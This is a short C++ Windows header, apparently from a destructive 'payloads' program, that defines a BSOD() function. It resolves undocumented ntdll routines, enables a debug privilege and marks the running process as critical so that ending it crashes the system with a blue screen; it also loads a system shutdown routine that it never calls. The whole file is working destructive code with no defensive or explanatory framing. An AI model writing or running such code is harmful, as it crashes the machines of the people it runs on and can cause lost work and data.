#pragma once
#include "interium_magnium_payloads.h"
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <math.h>
#include <time.h>
#include <TlHelp32.h>
#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(NTAPI* RAP)(IN ULONG, IN BOOLEAN, IN BOOLEAN, OUT PBOOLEAN);
typedef NTSTATUS(NTAPI* NSIP)(IN HANDLE, IN ULONG, IN PVOID, IN ULONG);
typedef NTSTATUS(NTAPI* NSS)(IN ULONG);

void BSOD() {
	HMODULE hntdll = GetModuleHandleW(L"ntdll.dll");
	RAP RtlAdjustPrivilege = (RAP)GetProcAddress(hntdll, "RtlAdjustPrivilege");
	NSIP NtSetInformationProcess = (NSIP)GetProcAddress(hntdll, "NtSetInformationProcess");
	NSS NtShutdownSystem = (NSS)GetProcAddress(hntdll, "NtShutdownSystem");

	BOOLEAN bl;
	ULONG breakonterminaton1 = 1;
	RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
	NtSetInformationProcess(GetCurrentProcess(), 0x1D, &breakonterminaton1, sizeof(ULONG));
}
